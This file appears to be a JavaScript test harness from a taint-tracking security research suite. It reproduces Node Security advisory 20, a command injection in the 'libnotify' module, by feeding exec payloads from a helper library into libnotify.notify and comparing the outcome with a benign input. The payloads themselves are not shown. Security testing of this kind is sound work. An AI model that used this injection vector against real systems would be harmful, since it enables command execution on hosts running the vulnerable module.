/**
 * Advisory 20: https://nodesecurity.io/advisories/20
 */
var utils = require("iflow");
var attackUtils = require("./AttackUtils.js");
attackUtils.setup();

var configs = require("./configs.json");
var policy = require("./Policy.js")(__dirname, null);

var libnotify = require('libnotify')

attackUtils.deliverPayloads(attackUtils.payloadsExec, function (payload) {
    if (configs.sources.intf === true) {
        payload = utils.source(payload, utils.HIGH_LEVEL, "module-interface");
    }
    libnotify.notify(payload, {title: ""}, function () {
    });
}, function(result, filesWithSinks) {
    var benignInput = "benign notification";
    if (configs.sources.intf === true) {
        benignInput = utils.source(benignInput, utils.HIGH_LEVEL, "module-interface");
    }
    libnotify.notify(benignInput, {title: ""}, function () {
    });
    setTimeout(function() {
        attackUtils.printCallStrings();
        result += " " + attackUtils.observedString(benignInput);
    }, 1000);
});
